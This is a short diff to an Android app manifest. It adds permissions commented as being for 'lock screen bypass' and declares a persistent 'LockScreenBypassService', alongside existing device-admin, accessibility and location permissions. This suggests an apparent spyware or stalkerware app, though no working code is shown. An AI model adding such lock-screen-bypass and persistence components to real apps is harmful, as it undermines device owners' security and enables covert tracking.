@@ -24,6 +24,11 @@
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
     
+    <!-- Lock screen bypass permissions -->
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.REAL_GET_TASKS" />
+    
     <!-- Location permissions -->
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -68,6 +73,12 @@
             
         <service
             android:name=".services.PersistentService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false" />
+            
+        <service
+            android:name=".services.LockScreenBypassService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false" />
